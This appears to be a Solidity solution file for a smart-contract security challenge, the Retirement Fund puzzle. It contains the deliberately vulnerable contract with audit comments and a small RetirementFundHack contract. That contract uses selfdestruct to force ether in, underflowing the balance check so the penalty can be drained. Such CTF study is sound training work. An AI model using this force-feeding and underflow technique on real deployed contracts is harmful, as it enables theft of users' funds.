pragma solidity ^0.4.21;

// This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.

// I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).

// I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        // OWNER sets beneficiary(player) and startBalance
        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        // the owner is the deployer
        // @audit only the deployer can call this
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty

            // @audit this might have huge precision issues
            // if balance is (address(this).balance * 9) < 10, then the transfer amount is 0
            // bear in mind that the balance is in wei
            msg.sender.transfer((address(this).balance * 9) / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        // the beneficiary is the player
        require(msg.sender == beneficiary);

        // startBalance is fixed -- 1 ether
        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // @audit we an reach here only if we withdrawn > 0
        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}

contract RetirementFundHack {
    function destructAndSend(address retirementFund) public {
        selfdestruct(retirementFund);
    }

    function() external payable {}
}
